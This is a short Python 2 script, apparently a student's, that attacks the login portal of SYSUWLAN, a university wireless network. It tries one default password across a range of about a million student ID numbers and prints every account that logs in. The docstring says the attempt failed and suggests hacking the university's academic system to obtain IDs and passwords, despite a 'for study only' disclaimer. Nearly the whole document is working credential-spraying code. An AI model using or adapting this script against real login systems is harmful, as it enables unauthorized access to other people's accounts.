'''
try to hack SYSUWLAN,but actually failed.
Because the user names,that what we call netids,are not easy to get.
Additionally,the default password is not easy to get.
But I did some work to analyse the protocal of SYSUWLAN,and to finish the rest,all we need is to get the netids and default password.
Anyone who interested in this maybe can start by hack the SYSU JW system.
All these just are using for study and all right reserved.
Attention：仅用于学习交流用，请勿用于非法用途。水表已拆，不收快递。
@author:Robin Chen
'''
import sys
reload(sys)
sys.setdefaultencoding('utf8')#encoding=utf8

import requests
import hashlib

###login in url

url = 'http://10.10.2.22/portal/logon.cgi'

#form header
header = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1)
 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36' }
def md5(str):
    m = hashlib.md5()
    m.update(str)
    return m.hexdigest()
def login(form_data):
    s = requests.session()
    #request
    response = s.post(url,data = form_data,headers = header)
    return response.content
def tryAccount(id_start,id_end,default_pass):
    #form data
    form_data = {'PtUser':'XXXXXX', #user name
        'PtPwd':'XXXXXX',  #pass word
        'PtButton':'Logon',# 需要有用于标记用户登录还是下线的属性”PtButton”，取值为"Logon"表示登录，取值为"Logoff"表示下线。
    }
    passwd = default_pass#抓包发现密码明文传输，所以无需加密再post
    
    form_data['PtPwd'] = passwd      #将密码填入表单
    for i in range(id_start,id_end):
        form_data['PtUser'] = str(i)  #将用户名填入表单
        result = login(form_data)       #登录，获取返回的 response 结果
        if result != 'password_error' and result != 'username_error':
            print str(i)+"\t"+result        #打印账号、密码正确的学号...
    print "\nYou are too young,too simple,sometimes naive"
if __name__ == "__main__":
    ID_START = 12112899   #起始学号
    ID_END = 13112899    #结束学号
    DEFAULT_PASS = "000000" #初始密码
    tryAccount(ID_START,ID_END,DEFAULT_PASS)
